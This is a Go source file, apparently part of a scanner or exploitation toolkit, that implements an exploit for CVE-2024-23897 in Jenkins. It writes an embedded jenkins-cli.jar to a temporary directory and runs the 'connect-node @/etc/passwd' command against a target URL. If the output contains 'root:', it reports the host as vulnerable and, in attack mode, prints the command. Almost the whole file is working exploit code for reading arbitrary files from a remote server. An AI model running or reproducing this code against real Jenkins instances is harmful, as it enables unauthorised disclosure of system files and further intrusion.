package CVEs

import (
	_ "embed"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

//go:embed jenkins-cli.jar
var jenkinsCLI []byte
var Output string

func CVE_2024_23897(url string, Attack bool) error {
	// 创建一个临时文件用于存储 jenkins-cli.jar
	tmpDir, err := ioutil.TempDir("", "jenkins-cli")
	if err != nil {
		return nil
	}
	defer os.RemoveAll(tmpDir) // 程序退出时清理临时目录

	jarPath := filepath.Join(tmpDir, "jenkins-cli.jar")

	// 将嵌入的 .jar 文件写入临时目录
	err = ioutil.WriteFile(jarPath, jenkinsCLI, 0644)
	if err != nil {
		return nil
	}

	// 准备命令及其参数
	cmd := exec.Command("java", "-jar", jarPath, "-s", url, "connect-node", "@/etc/passwd")

	// 使用 CombinedOutput 来捕获标准输出和标准错误
	output, err := cmd.CombinedOutput()
	Output = string(output)
	if err != nil {
		if strings.Contains(Output, "this version of the Java Runtime") {
			fmt.Println("[-]CVE-2024-23897 : " + "请尝试更换jdk11~jdk17")
		} else if strings.Contains(Output, "root:") {
			fmt.Println("[*]CVE-2024-23897 : " + url)
			if Attack {
				fmt.Println(fmt.Sprintf("Attack-Result : %s`\n", cmd))
			}
		} else if strings.Contains(Output, "不是") {
			fmt.Println("[-]CVE-2024-23897 : " + "请检查jdk是否被正确安装")
		} else {
			return nil
		}
	}

	return nil
}
